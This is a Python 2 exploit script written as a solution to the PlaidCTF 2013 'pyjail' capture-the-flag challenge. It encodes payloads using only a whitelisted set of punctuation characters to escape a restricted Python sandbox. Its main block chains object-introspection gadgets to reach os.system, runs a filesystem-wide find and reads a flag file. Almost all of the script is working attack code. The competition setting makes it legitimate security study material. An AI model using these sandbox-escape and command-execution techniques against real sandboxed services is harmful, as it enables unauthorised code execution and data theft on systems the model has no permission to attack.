#!/usr/bin/env python
# -*- coding: utf-8 -*-
## trucgen.py for  in /home/wapiflapi
##
## Made by Wannes Rombouts
## Login   <wapiflapi@epitech.net>
##
## Started on  Sun Apr 21 01:28:57 2013 Wannes Rombouts
## Last update Mon Apr 22 01:13:30 2013 Wannes Rombouts
##

# plaidctf 2013 pyjail, 400

import sys
import string

authorized = set([':', '%', "'", '`', '\t', '(', '\x0b', ',',
                  ')', '}', '{', '[', '.', ']', '<', '_', '~'])

def mk(c):

    if type(c) != str:
        raise TypeError("c must be str")

    if c in "0123456789bcdf":
        ret =  "`'%c'`[({}<[])<<({}<[])<<({}<[])]" % (0xe0+("0123456789abcdef".index(c)))
        return ret

    # True

    if c == "T":
        return "`{}<[]`[{}<{}]"
    if c == "r":
        return "`{}<[]`[{}<[]]"
    if c == "u":
        return "`{}<[]`[~({}<{})<<({}<[])]"
    if c == "e":
        return "`{}<[]`[~({}<{})]"

    # False

    if c == "F":
        return "`{}<{}`[{}<{}]"
    if c == "a":
        return "`{}<{}`[{}<[]]"
    if c == "l":
        return "`{}<{}`[({}<[])<<({}<[])]"
    if c == "s":
        return "`{}<{}`[~({}<{})<<({}<[])]"
    if c == "e":
        return "`{}<{}`[~({}<{})]"

    # if c == "'":
    #     return "`'\xe5'`[{}<{}]"
    # if c == "\\":
    #     return "`'\xe5'`[{}<[]]"
    if c == "x":
        return "`'\xe5'`[({}<[])<<({}<[])]"

    if c in authorized:
        return "'%c'" % c

    # important: p, i, n, t,
    # OK no  more time for clever encodings. Just let it be coded fast.

    if c == "p":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~({}<[])<<({}<[])<<({}<[]))<<({}<[])<<({}<[])<<({}<[])<<({}<[]))"

    if c == "i":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%~(~(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])<<({}<[]))<<({}<[]))"

    if c == "n":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])<<({}<[]))<<({}<[]))"

    if c == "t":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])<<({}<[]))"

    if c == ";":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[])<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])))"

    if c == "-":
        return "`~({}<[])`[[]<[]]"

    if c == "=":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[])<<({}<[])<<({}<[]))<<({}<[]))<<({}<[])))"

    if c == "\"":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(({}<[])<<({}<[])<<({}<[])<<({}<[]))<<({}<[]))<<({}<[]))"

    if c == "+":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])))"

    if c == "/":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(({}<[])<<({}<[]))<<({}<[])<<({}<[])<<({}<[])<<({}<[])))"

    if c == "m":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[])<<({}<[]))<<({}<[]))<<({}<[])))"

    if c == "h":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])<<({}<[]))"

    if c == "o":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])<<({}<[])<<({}<[])))"

    if c == "y":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[])<<({}<[])<<({}<[]))<<({}<[])<<({}<[]))<<({}<[])))"

    if c == "j":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))"

    if c == "w":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[])<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])<<({}<[])))"

    if c == "k":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])<<({}<[])))"

    if c == "g":
        return "`'%\xbc'`[{}<[]::({}<[])<<({}<[])<<({}<[])]%(~(~(~(~({}<[])<<({}<[]))<<({}<[])<<({}<[]))<<({}<[])<<({}<[])<<({}<[])))"

    raise NotImplementedError("No translation for <%c>" % c)



def gen_shellcode(payload):

    print >>sys.stderr, "[*] Generating shell code for : %s" % payload

    shellcode = "`[%s]`[~(({}<[])<<({}<[]))::~(({}<[])<<({}<[])<<({}<[]))]" % ",".join(mk(x) for x in reversed(payload))

    # Lets do some sanity checks.

    filtered = shellcode.split()[0]
    filtered = filtered.translate(''.join((chr(i) for i in xrange(256))),
                                   '!"#$&*+-/0123456789;=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\^abcdefghijklmnopqrstuvwxyz|')
    for i, (s, f) in enumerate(zip(shellcode, filtered)):
        if s != f: print "[*] Diff at idx %d: %s != %s" % (i, s, f)

    if len(shellcode) > 1900:
        print >>sys.stderr, "[!] Shellcode too big : %d bytes." % len(shellcode)
        exit(1)

    print >>sys.stderr, "[*] New shellcode of %d bytes." % len(shellcode)
    return shellcode


if __name__ == '__main__':

    # Some helper gadgets.
    store_stuff = "0;0..__class__.__base__.__subclasses__()[-2].a=\"%s\""
    add_stuff   = "0;0..__class__.__base__.__subclasses__()[-2].a+=\"%s\""
    print_stuff = "0;print(().__class__.__base__.__subclasses__()[-2].c)"
    read_file   = "().__class__.__base__.__subclasses__();print(a[-1](a[-2].a).read())"

    # Final race.
    # Had to `find` the entire drive because no spaces allowed and only got 2 minutes.
    have_fun1    = "().__class__.__base__.__subclasses__();a[-2].b=a[49].__repr__"
    have_fun2    = "().__class__.__base__.__subclasses__();a[-2].b=a[-2].im_func"
    have_fun3    = "().__class__.__base__.__subclasses__();a[-2].c=\"linecache\""
    have_fun4    = "().__class__.__base__.__subclasses__();a[-2].b=a[-2].b.func_globals[a[-2].c]"
    have_fun5    = "().__class__.__base__.__subclasses__();a[-2].b=a[-2].b.os.system"
    have_fun6    = "().__class__.__base__.__subclasses__();a[-2].b(\"find\")"


    # After grepping the dump of the junk above we find this file:
    path_blocks = ["".join(x) for x in zip(*[iter("/home/pyjail/the_flag_is_actually_in_this_file")]*2)]

    # Do stuff defined above..
    print gen_shellcode(have_fun1)
    print gen_shellcode(have_fun2)
    print gen_shellcode(have_fun3)
    print gen_shellcode(have_fun4)
    print gen_shellcode(have_fun5)
    print gen_shellcode(have_fun6)

    # Finaly read the file !
    print gen_shellcode(store_stuff % "")
    for b in path_blocks:
        print gen_shellcode(add_stuff % b)
    print gen_shellcode(read_file)

    # Now just pipe all this to the server. The \n should give us plenty of tries.
